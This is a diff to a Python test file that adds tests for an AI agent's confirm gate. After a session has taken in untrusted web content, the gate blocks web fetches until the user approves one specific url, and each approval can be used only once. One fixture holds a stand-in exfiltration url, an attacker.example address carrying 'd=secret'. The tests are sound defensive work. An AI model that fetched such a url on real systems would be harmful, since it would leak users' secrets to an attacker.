@@ -12,7 +12,9 @@ Mutation-verified with PYTHONDONTWRITEBYTECODE=1 (the standing rule): dropping
 the taint condition, dropping the fingerprint comparison, keeping the approval
 after use, approving on a substring instead of the whole utterance, skipping the
 directive strip, widening the word set, and removing the one-shot each turn a
-test RED.
+test RED. Since DEC-143 ruling ① the same holds for FETCH: an approval of one url
+releasing another, and a fetch approval spent twice, each survived the whole
+suite until the fetch twins below — no test had ever approved a fetch.
 
 Run:  set PYTHONPATH=src && python -m pytest tests/test_confirm_gate.py -q
 """
@@ -37,31 +39,40 @@ from muthis_sdk import ToolDescriptor, ToolPlugin, ToolResult
 NETWORK = frozenset({NETWORK_CAPABILITY})
 APPROVE_AR = "أوافق"
 SEARCH = namespaced_name("web", "search")
+FETCH = namespaced_name("web", "fetch")
+URL_A = {"url": "https://docs.python.org/3/"}
+URL_B = {"url": "https://attacker.example/?d=secret"}
 
 
 class _WebPlugin(ToolPlugin):
     """Stands in for the T6 web plugin: mounted with net.fetch granted and
-    taint=True, exactly as DEC-24/DEC-27 say it will be."""
+    taint=True, exactly as DEC-24/DEC-27 say it will be.
 
-    def __init__(self) -> None:
+    It offers SEARCH ALONE unless asked for more — which is how every binding
+    test here ran on `web__search` only and no test ever approved a fetch
+    (found at DEC-143's freeze). `names` lets the fetch twins mount the
+    production shape: ONE plugin, BOTH tools, ONE `RouteImpact`."""
+
+    def __init__(self, names=("search",)) -> None:
         self.calls: list[dict] = []
+        self._names = names
 
     def descriptors(self):
         return [ToolDescriptor(
-            name="search",
-            schema={"name": "search", "description": "d", "input_schema": {}},
-            kernel_serviced=False)]
+            name=name,
+            schema={"name": name, "description": "d", "input_schema": {}},
+            kernel_serviced=False) for name in self._names]
 
     async def execute(self, tool, args, ctx):
         self.calls.append(dict(args))
         return ToolResult(text_ar="نتائج البحث")
 
 
-def _tainted_web_router(ledger=None) -> tuple[ToolRouter, _WebPlugin]:
+def _tainted_web_router(ledger=None, names=("search",)) -> tuple[ToolRouter, _WebPlugin]:
     """A session that has ALREADY ingested untrusted content — the state the
     gate exists for. The taint is raised explicitly rather than by a first call,
     so each test starts from the condition it is about."""
-    plugin = _WebPlugin()
+    plugin = _WebPlugin(names)
     router = ToolRouter(plugin_ledger=ledger)
     router.mount(plugin, namespace="web", provenance="web:test", taint=True,
                  impact=RouteImpact(capabilities=NETWORK))
@@ -233,6 +244,38 @@ def test_the_approval_is_single_use():
     assert first.result.is_error is False
     assert second.result.is_error is True
     assert len(plugin.calls) == 1
+
+
+def test_a_FETCH_approval_does_not_release_a_DIFFERENT_url():
+    """THE FETCH TWIN of `test_a_modified_call_is_not_unlocked_by_the_earlier_approval`
+    (DEC-143 ruling ①), landed BEFORE search's twin flips so the property the whole
+    design rests on is never unguarded for one commit. Fetch is the one path to an
+    attacker-chosen endpoint, so its approval covers the url the user heard and no
+    other. Before this test, a fetch approval that released ANY url stayed green."""
+    router, plugin = _tainted_web_router(names=("search", "fetch"))
+    _service(router, tool=FETCH, args=URL_A)            # turn N: refused, pending recorded
+    _speak(router, APPROVE_AR)                          # turn N+1: approved — for URL_A
+    outcome = _service(router, tool=FETCH, args=URL_B)  # a DIFFERENT url
+
+    assert outcome.result.is_error is True
+    assert outcome.provenance == "kernel:confirm"
+    assert plugin.calls == [], "an approval of one url released another"
+
+
+def test_a_FETCH_approval_is_single_use():
+    """THE FETCH TWIN of `test_the_approval_is_single_use` (DEC-143 ruling ①): the
+    same url fetched twice is two requests for permission, never one. Before this
+    test, a REUSABLE fetch approval stayed green."""
+    router, plugin = _tainted_web_router(names=("search", "fetch"))
+    _service(router, tool=FETCH, args=URL_A)
+    _speak(router, APPROVE_AR)
+
+    first = _service(router, tool=FETCH, args=URL_A)
+    second = _service(router, tool=FETCH, args=URL_A)
+
+    assert first.result.is_error is False
+    assert second.result.is_error is True, "a fetch approval was spent twice"
+    assert plugin.calls == [URL_A]
 
 
 def test_the_pending_state_expires_at_the_first_turn_carrying_no_approval():
